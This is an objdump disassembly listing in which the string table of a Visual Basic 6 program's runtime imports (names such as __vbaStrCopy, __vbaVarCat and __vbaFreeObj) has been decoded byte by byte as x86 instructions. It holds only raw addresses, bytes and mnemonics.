  4068ff:	4f                   	dec    %edi
  406900:	62 6a 49             	bound  %ebp,0x49(%edx)
  406903:	73 00                	jae    0x406905
  406905:	00 00                	add    %al,(%eax)
  406907:	00 45 56             	add    %al,0x56(%ebp)
  40690a:	45                   	inc    %ebp
  40690b:	4e                   	dec    %esi
  40690c:	54                   	push   %esp
  40690d:	5f                   	pop    %edi
  40690e:	53                   	push   %ebx
  40690f:	49                   	dec    %ecx
  406910:	4e                   	dec    %esi
  406911:	4b                   	dec    %ebx
  406912:	5f                   	pop    %edi
  406913:	51                   	push   %ecx
  406914:	75 65                	jne    0x40697b
  406916:	72 79                	jb     0x406991
  406918:	49                   	dec    %ecx
  406919:	6e                   	outsb  %ds:(%esi),(%dx)
  40691a:	74 65                	je     0x406981
  40691c:	72 66                	jb     0x406984
  40691e:	61                   	popa
  40691f:	63 65 00             	arpl   %esp,0x0(%ebp)
  406922:	00 00                	add    %al,(%eax)
  406924:	5f                   	pop    %edi
  406925:	5f                   	pop    %edi
  406926:	76 62                	jbe    0x40698a
  406928:	61                   	popa
  406929:	55                   	push   %ebp
  40692a:	49                   	dec    %ecx
  40692b:	31 49 34             	xor    %ecx,0x34(%ecx)
  40692e:	00 00                	add    %al,(%eax)
  406930:	00 00                	add    %al,(%eax)
  406932:	5f                   	pop    %edi
  406933:	5f                   	pop    %edi
  406934:	76 62                	jbe    0x406998
  406936:	61                   	popa
  406937:	53                   	push   %ebx
  406938:	74 72                	je     0x4069ac
  40693a:	55                   	push   %ebp
  40693b:	49                   	dec    %ecx
  40693c:	31 00                	xor    %eax,(%eax)
  40693e:	00 00                	add    %al,(%eax)
  406940:	5f                   	pop    %edi
  406941:	5f                   	pop    %edi
  406942:	76 62                	jbe    0x4069a6
  406944:	61                   	popa
  406945:	45                   	inc    %ebp
  406946:	78 63                	js     0x4069ab
  406948:	65 70 74             	gs jo  0x4069bf
  40694b:	48                   	dec    %eax
  40694c:	61                   	popa
  40694d:	6e                   	outsb  %ds:(%esi),(%dx)
  40694e:	64 6c                	fs insb (%dx),%es:(%edi)
  406950:	65 72 00             	gs jb  0x406953
  406953:	00 00                	add    %al,(%eax)
  406955:	00 5f 5f             	add    %bl,0x5f(%edi)
  406958:	76 62                	jbe    0x4069bc
  40695a:	61                   	popa
  40695b:	49                   	dec    %ecx
  40695c:	6e                   	outsb  %ds:(%esi),(%dx)
  40695d:	70 75                	jo     0x4069d4
  40695f:	74 46                	je     0x4069a7
  406961:	69 6c 65 00 00 00 00 	imul   $0x5f000000,0x0(%ebp,%eiz,2),%ebp
  406968:	5f 
  406969:	5f                   	pop    %edi
  40696a:	76 62                	jbe    0x4069ce
  40696c:	61                   	popa
  40696d:	50                   	push   %eax
  40696e:	72 69                	jb     0x4069d9
  406970:	6e                   	outsb  %ds:(%esi),(%dx)
  406971:	74 46                	je     0x4069b9
  406973:	69 6c 65 00 00 00 00 	imul   $0x5f000000,0x0(%ebp,%eiz,2),%ebp
  40697a:	5f 
  40697b:	61                   	popa
  40697c:	64 6a 5f             	fs push $0x5f
  40697f:	66 70 72             	data16 jo 0x4069f4
  406982:	65 6d                	gs insl (%dx),%es:(%edi)
  406984:	00 00                	add    %al,(%eax)
  406986:	00 00                	add    %al,(%eax)
  406988:	5f                   	pop    %edi
  406989:	61                   	popa
  40698a:	64 6a 5f             	fs push $0x5f
  40698d:	66 64 69 76 72 5f 6d 	imul   $0x6d5f,%fs:0x72(%esi),%si
  406994:	36 34 00             	ss xor $0x0,%al
  406997:	00 00                	add    %al,(%eax)
  406999:	00 5f 5f             	add    %bl,0x5f(%edi)
  40699c:	76 62                	jbe    0x406a00
  40699e:	61                   	popa
  40699f:	46                   	inc    %esi
  4069a0:	50                   	push   %eax
  4069a1:	45                   	inc    %ebp
  4069a2:	78 63                	js     0x406a07
  4069a4:	65 70 74             	gs jo  0x406a1b
  4069a7:	69 6f 6e 00 00 00 00 	imul   $0x0,0x6e(%edi),%ebp
  4069ae:	5f                   	pop    %edi
  4069af:	5f                   	pop    %edi
  4069b0:	76 62                	jbe    0x406a14
  4069b2:	61                   	popa
  4069b3:	55                   	push   %ebp
  4069b4:	62 6f 75             	bound  %ebp,0x75(%edi)
  4069b7:	6e                   	outsb  %ds:(%esi),(%dx)
  4069b8:	64 00 00             	add    %al,%fs:(%eax)
  4069bb:	00 5f 5f             	add    %bl,0x5f(%edi)
  4069be:	76 62                	jbe    0x406a22
  4069c0:	61                   	popa
  4069c1:	53                   	push   %ebx
  4069c2:	74 72                	je     0x406a36
  4069c4:	56                   	push   %esi
  4069c5:	61                   	popa
  4069c6:	72 56                	jb     0x406a1e
  4069c8:	61                   	popa
  4069c9:	6c                   	insb   (%dx),%es:(%edi)
  4069ca:	00 00                	add    %al,(%eax)
  4069cc:	00 00                	add    %al,(%eax)
  4069ce:	5f                   	pop    %edi
  4069cf:	5f                   	pop    %edi
  4069d0:	76 62                	jbe    0x406a34
  4069d2:	61                   	popa
  4069d3:	56                   	push   %esi
  4069d4:	61                   	popa
  4069d5:	72 43                	jb     0x406a1a
  4069d7:	61                   	popa
  4069d8:	74 00                	je     0x4069da
  4069da:	00 00                	add    %al,(%eax)
  4069dc:	5f                   	pop    %edi
  4069dd:	43                   	inc    %ebx
  4069de:	49                   	dec    %ecx
  4069df:	6c                   	insb   (%dx),%es:(%edi)
  4069e0:	6f                   	outsl  %ds:(%esi),(%dx)
  4069e1:	67 00 00             	add    %al,(%bx,%si)
  4069e4:	00 00                	add    %al,(%eax)
  4069e6:	5f                   	pop    %edi
  4069e7:	5f                   	pop    %edi
  4069e8:	76 62                	jbe    0x406a4c
  4069ea:	61                   	popa
  4069eb:	45                   	inc    %ebp
  4069ec:	72 72                	jb     0x406a60
  4069ee:	6f                   	outsl  %ds:(%esi),(%dx)
  4069ef:	72 4f                	jb     0x406a40
  4069f1:	76 65                	jbe    0x406a58
  4069f3:	72 66                	jb     0x406a5b
  4069f5:	6c                   	insb   (%dx),%es:(%edi)
  4069f6:	6f                   	outsl  %ds:(%esi),(%dx)
  4069f7:	77 00                	ja     0x4069f9
  4069f9:	00 00                	add    %al,(%eax)
  4069fb:	00 5f 5f             	add    %bl,0x5f(%edi)
  4069fe:	76 62                	jbe    0x406a62
  406a00:	61                   	popa
  406a01:	46                   	inc    %esi
  406a02:	69 6c 65 4f 70 65 6e 	imul   $0x6e6570,0x4f(%ebp,%eiz,2),%ebp
  406a09:	00 
  406a0a:	00 00                	add    %al,(%eax)
  406a0c:	5f                   	pop    %edi
  406a0d:	5f                   	pop    %edi
  406a0e:	76 62                	jbe    0x406a72
  406a10:	61                   	popa
  406a11:	56                   	push   %esi
  406a12:	61                   	popa
  406a13:	72 32                	jb     0x406a47
  406a15:	56                   	push   %esi
  406a16:	65 63 00             	arpl   %eax,%gs:(%eax)
  406a19:	00 00                	add    %al,(%eax)
  406a1b:	00 5f 5f             	add    %bl,0x5f(%edi)
  406a1e:	76 62                	jbe    0x406a82
  406a20:	61                   	popa
  406a21:	56                   	push   %esi
  406a22:	61                   	popa
  406a23:	72 4c                	jb     0x406a71
  406a25:	61                   	popa
  406a26:	74 65                	je     0x406a8d
  406a28:	4d                   	dec    %ebp
  406a29:	65 6d                	gs insl (%dx),%es:(%edi)
  406a2b:	43                   	inc    %ebx
  406a2c:	61                   	popa
  406a2d:	6c                   	insb   (%dx),%es:(%edi)
  406a2e:	6c                   	insb   (%dx),%es:(%edi)
  406a2f:	4c                   	dec    %esp
  406a30:	64 52                	fs push %edx
  406a32:	66 00 00             	data16 add %al,(%eax)
  406a35:	00 5f 5f             	add    %bl,0x5f(%edi)
  406a38:	76 62                	jbe    0x406a9c
  406a3a:	61                   	popa
  406a3b:	4e                   	dec    %esi
  406a3c:	65 77 32             	gs ja  0x406a71
  406a3f:	00 00                	add    %al,(%eax)
  406a41:	00 5f 61             	add    %bl,0x61(%edi)
  406a44:	64 6a 5f             	fs push $0x5f
  406a47:	66 64 69 76 5f 6d 33 	imul   $0x336d,%fs:0x5f(%esi),%si
  406a4e:	32 69 00             	xor    0x0(%ecx),%ch
  406a51:	00 00                	add    %al,(%eax)
  406a53:	00 5f 61             	add    %bl,0x61(%edi)
  406a56:	64 6a 5f             	fs push $0x5f
  406a59:	66 64 69 76 72 5f 6d 	imul   $0x6d5f,%fs:0x72(%esi),%si
  406a60:	33 32                	xor    (%edx),%esi
  406a62:	69 00 00 00 5f 5f    	imul   $0x5f5f0000,(%eax),%eax
  406a68:	76 62                	jbe    0x406acc
  406a6a:	61                   	popa
  406a6b:	53                   	push   %ebx
  406a6c:	74 72                	je     0x406ae0
  406a6e:	43                   	inc    %ebx
  406a6f:	6f                   	outsl  %ds:(%esi),(%dx)
  406a70:	70 79                	jo     0x406aeb
  406a72:	00 00                	add    %al,(%eax)
  406a74:	00 00                	add    %al,(%eax)
  406a76:	5f                   	pop    %edi
  406a77:	5f                   	pop    %edi
  406a78:	76 62                	jbe    0x406adc
  406a7a:	61                   	popa
  406a7b:	49                   	dec    %ecx
  406a7c:	34 53                	xor    $0x53,%al
  406a7e:	74 72                	je     0x406af2
  406a80:	00 00                	add    %al,(%eax)
  406a82:	00 00                	add    %al,(%eax)
  406a84:	5f                   	pop    %edi
  406a85:	5f                   	pop    %edi
  406a86:	76 62                	jbe    0x406aea
  406a88:	61                   	popa
  406a89:	46                   	inc    %esi
  406a8a:	72 65                	jb     0x406af1
  406a8c:	65 53                	gs push %ebx
  406a8e:	74 72                	je     0x406b02
  406a90:	4c                   	dec    %esp
  406a91:	69 73 74 00 00 00 00 	imul   $0x0,0x74(%ebx),%esi
  406a98:	5f                   	pop    %edi
  406a99:	5f                   	pop    %edi
  406a9a:	76 62                	jbe    0x406afe
  406a9c:	61                   	popa
  406a9d:	56                   	push   %esi
  406a9e:	61                   	popa
  406a9f:	72 4e                	jb     0x406aef
  406aa1:	6f                   	outsl  %ds:(%esi),(%dx)
  406aa2:	74 00                	je     0x406aa4
  406aa4:	00 00                	add    %al,(%eax)
  406aa6:	5f                   	pop    %edi
  406aa7:	61                   	popa
  406aa8:	64 6a 5f             	fs push $0x5f
  406aab:	66 64 69 76 72 5f 6d 	imul   $0x6d5f,%fs:0x72(%esi),%si
  406ab2:	33 32                	xor    (%edx),%esi
  406ab4:	00 00                	add    %al,(%eax)
  406ab6:	00 00                	add    %al,(%eax)
  406ab8:	5f                   	pop    %edi
  406ab9:	61                   	popa
  406aba:	64 6a 5f             	fs push $0x5f
  406abd:	66 64 69 76 5f 72 00 	imul   $0x72,%fs:0x5f(%esi),%si
  406ac4:	00 00                	add    %al,(%eax)
  406ac6:	5f                   	pop    %edi
  406ac7:	5f                   	pop    %edi
  406ac8:	76 62                	jbe    0x406b2c
  406aca:	61                   	popa
  406acb:	56                   	push   %esi
  406acc:	61                   	popa
  406acd:	72 53                	jb     0x406b22
  406acf:	65 74 56             	gs je  0x406b28
  406ad2:	61                   	popa
  406ad3:	72 00                	jb     0x406ad5
  406ad5:	00 00                	add    %al,(%eax)
  406ad7:	00 5f 5f             	add    %bl,0x5f(%edi)
  406ada:	76 62                	jbe    0x406b3e
  406adc:	61                   	popa
  406add:	49                   	dec    %ecx
  406ade:	34 56                	xor    $0x56,%al
  406ae0:	61                   	popa
  406ae1:	72 00                	jb     0x406ae3
  406ae3:	00 00                	add    %al,(%eax)
  406ae5:	00 5f 5f             	add    %bl,0x5f(%edi)
  406ae8:	76 62                	jbe    0x406b4c
  406aea:	61                   	popa
  406aeb:	56                   	push   %esi
  406aec:	61                   	popa
  406aed:	72 43                	jb     0x406b32
  406aef:	6d                   	insl   (%dx),%es:(%edi)
  406af0:	70 45                	jo     0x406b37
  406af2:	71 00                	jno    0x406af4
  406af4:	00 00                	add    %al,(%eax)
  406af6:	5f                   	pop    %edi
  406af7:	5f                   	pop    %edi
  406af8:	76 62                	jbe    0x406b5c
  406afa:	61                   	popa
  406afb:	41                   	inc    %ecx
  406afc:	72 79                	jb     0x406b77
  406afe:	4c                   	dec    %esp
  406aff:	6f                   	outsl  %ds:(%esi),(%dx)
  406b00:	63 6b 00             	arpl   %ebp,0x0(%ebx)
  406b03:	00 00                	add    %al,(%eax)
  406b05:	00 5f 5f             	add    %bl,0x5f(%edi)
  406b08:	76 62                	jbe    0x406b6c
  406b0a:	61                   	popa
  406b0b:	4c                   	dec    %esp
  406b0c:	61                   	popa
  406b0d:	74 65                	je     0x406b74
  406b0f:	4d                   	dec    %ebp
  406b10:	65 6d                	gs insl (%dx),%es:(%edi)
  406b12:	43                   	inc    %ebx
  406b13:	61                   	popa
  406b14:	6c                   	insb   (%dx),%es:(%edi)
  406b15:	6c                   	insb   (%dx),%es:(%edi)
  406b16:	00 00                	add    %al,(%eax)
  406b18:	00 00                	add    %al,(%eax)
  406b1a:	5f                   	pop    %edi
  406b1b:	5f                   	pop    %edi
  406b1c:	76 62                	jbe    0x406b80
  406b1e:	61                   	popa
  406b1f:	56                   	push   %esi
  406b20:	61                   	popa
  406b21:	72 41                	jb     0x406b64
  406b23:	64 64 00 00          	fs add %al,%fs:(%eax)
  406b27:	00 5f 5f             	add    %bl,0x5f(%edi)
  406b2a:	76 62                	jbe    0x406b8e
  406b2c:	61                   	popa
  406b2d:	56                   	push   %esi
  406b2e:	61                   	popa
  406b2f:	72 44                	jb     0x406b75
  406b31:	75 70                	jne    0x406ba3
  406b33:	00 00                	add    %al,(%eax)
  406b35:	00 5f 5f             	add    %bl,0x5f(%edi)
  406b38:	76 62                	jbe    0x406b9c
  406b3a:	61                   	popa
  406b3b:	56                   	push   %esi
  406b3c:	61                   	popa
  406b3d:	72 43                	jb     0x406b82
  406b3f:	6f                   	outsl  %ds:(%esi),(%dx)
  406b40:	70 79                	jo     0x406bbb
  406b42:	00 00                	add    %al,(%eax)
  406b44:	00 00                	add    %al,(%eax)
  406b46:	5f                   	pop    %edi
  406b47:	5f                   	pop    %edi
  406b48:	76 62                	jbe    0x406bac
  406b4a:	61                   	popa
  406b4b:	56                   	push   %esi
  406b4c:	61                   	popa
  406b4d:	72 4c                	jb     0x406b9b
  406b4f:	61                   	popa
  406b50:	74 65                	je     0x406bb7
  406b52:	4d                   	dec    %ebp
  406b53:	65 6d                	gs insl (%dx),%es:(%edi)
  406b55:	43                   	inc    %ebx
  406b56:	61                   	popa
  406b57:	6c                   	insb   (%dx),%es:(%edi)
  406b58:	6c                   	insb   (%dx),%es:(%edi)
  406b59:	4c                   	dec    %esp
  406b5a:	64 00 00             	add    %al,%fs:(%eax)
  406b5d:	00 5f 5f             	add    %bl,0x5f(%edi)
  406b60:	76 62                	jbe    0x406bc4
  406b62:	61                   	popa
  406b63:	55                   	push   %ebp
  406b64:	6e                   	outsb  %ds:(%esi),(%dx)
  406b65:	6b 56 61 72          	imul   $0x72,0x61(%esi),%edx
  406b69:	00 00                	add    %al,(%eax)
  406b6b:	00 5f 5f             	add    %bl,0x5f(%edi)
  406b6e:	76 62                	jbe    0x406bd2
  406b70:	61                   	popa
  406b71:	56                   	push   %esi
  406b72:	61                   	popa
  406b73:	72 53                	jb     0x406bc8
  406b75:	65 74 4f             	gs je  0x406bc7
  406b78:	62 6a 41             	bound  %ebp,0x41(%edx)
  406b7b:	64 64 72 65          	fs fs jb 0x406be4
  406b7f:	66 00 00             	data16 add %al,(%eax)
  406b82:	00 00                	add    %al,(%eax)
  406b84:	5f                   	pop    %edi
  406b85:	43                   	inc    %ebx
  406b86:	49                   	dec    %ecx
  406b87:	61                   	popa
  406b88:	74 61                	je     0x406beb
  406b8a:	6e                   	outsb  %ds:(%esi),(%dx)
  406b8b:	00 00                	add    %al,(%eax)
  406b8d:	00 5f 5f             	add    %bl,0x5f(%edi)
  406b90:	76 62                	jbe    0x406bf4
  406b92:	61                   	popa
  406b93:	41                   	inc    %ecx
  406b94:	72 79                	jb     0x406c0f
  406b96:	43                   	inc    %ebx
  406b97:	6f                   	outsl  %ds:(%esi),(%dx)
  406b98:	70 79                	jo     0x406c13
  406b9a:	00 00                	add    %al,(%eax)
  406b9c:	00 00                	add    %al,(%eax)
  406b9e:	5f                   	pop    %edi
  406b9f:	5f                   	pop    %edi
  406ba0:	76 62                	jbe    0x406c04
  406ba2:	61                   	popa
  406ba3:	53                   	push   %ebx
  406ba4:	74 72                	je     0x406c18
  406ba6:	4d                   	dec    %ebp
  406ba7:	6f                   	outsl  %ds:(%esi),(%dx)
  406ba8:	76 65                	jbe    0x406c0f
  406baa:	00 00                	add    %al,(%eax)
  406bac:	00 00                	add    %al,(%eax)
  406bae:	5f                   	pop    %edi
  406baf:	5f                   	pop    %edi
  406bb0:	76 62                	jbe    0x406c14
  406bb2:	61                   	popa
  406bb3:	53                   	push   %ebx
  406bb4:	74 72                	je     0x406c28
  406bb6:	56                   	push   %esi
  406bb7:	61                   	popa
  406bb8:	72 43                	jb     0x406bfd
  406bba:	6f                   	outsl  %ds:(%esi),(%dx)
  406bbb:	70 79                	jo     0x406c36
  406bbd:	00 00                	add    %al,(%eax)
  406bbf:	00 5f 61             	add    %bl,0x61(%edi)
  406bc2:	6c                   	insb   (%dx),%es:(%edi)
  406bc3:	6c                   	insb   (%dx),%es:(%edi)
  406bc4:	6d                   	insl   (%dx),%es:(%edi)
  406bc5:	75 6c                	jne    0x406c33
  406bc7:	00 00                	add    %al,(%eax)
  406bc9:	00 5f 5f             	add    %bl,0x5f(%edi)
  406bcc:	76 62                	jbe    0x406c30
  406bce:	61                   	popa
  406bcf:	56                   	push   %esi
  406bd0:	61                   	popa
  406bd1:	72 4c                	jb     0x406c1f
  406bd3:	61                   	popa
  406bd4:	74 65                	je     0x406c3b
  406bd6:	4d                   	dec    %ebp
  406bd7:	65 6d                	gs insl (%dx),%es:(%edi)
  406bd9:	43                   	inc    %ebx
  406bda:	61                   	popa
  406bdb:	6c                   	insb   (%dx),%es:(%edi)
  406bdc:	6c                   	insb   (%dx),%es:(%edi)
  406bdd:	53                   	push   %ebx
  406bde:	74 00                	je     0x406be0
  406be0:	00 00                	add    %al,(%eax)
  406be2:	5f                   	pop    %edi
  406be3:	43                   	inc    %ebx
  406be4:	49                   	dec    %ecx
  406be5:	74 61                	je     0x406c48
  406be7:	6e                   	outsb  %ds:(%esi),(%dx)
  406be8:	00 00                	add    %al,(%eax)
  406bea:	00 00                	add    %al,(%eax)
  406bec:	5f                   	pop    %edi
  406bed:	5f                   	pop    %edi
  406bee:	76 62                	jbe    0x406c52
  406bf0:	61                   	popa
  406bf1:	41                   	inc    %ecx
  406bf2:	72 79                	jb     0x406c6d
  406bf4:	55                   	push   %ebp
  406bf5:	6e                   	outsb  %ds:(%esi),(%dx)
  406bf6:	6c                   	insb   (%dx),%es:(%edi)
  406bf7:	6f                   	outsl  %ds:(%esi),(%dx)
  406bf8:	63 6b 00             	arpl   %ebp,0x0(%ebx)
  406bfb:	00 00                	add    %al,(%eax)
  406bfd:	00 5f 43             	add    %bl,0x43(%edi)
  406c00:	49                   	dec    %ecx
  406c01:	65 78 70             	gs js  0x406c74
  406c04:	00 00                	add    %al,(%eax)
  406c06:	00 00                	add    %al,(%eax)
  406c08:	5f                   	pop    %edi
  406c09:	5f                   	pop    %edi
  406c0a:	76 62                	jbe    0x406c6e
  406c0c:	61                   	popa
  406c0d:	46                   	inc    %esi
  406c0e:	72 65                	jb     0x406c75
  406c10:	65 53                	gs push %ebx
  406c12:	74 72                	je     0x406c86
  406c14:	00 00                	add    %al,(%eax)
  406c16:	00 00                	add    %al,(%eax)
  406c18:	5f                   	pop    %edi
  406c19:	5f                   	pop    %edi
  406c1a:	76 62                	jbe    0x406c7e
  406c1c:	61                   	popa
  406c1d:	46                   	inc    %esi
  406c1e:	72 65                	jb     0x406c85
  406c20:	65 4f                	gs dec %edi
  406c22:	62 6a 00             	bound  %ebp,0x0(%edx)
  406c25:	00 00                	add    %al,(%eax)
	...
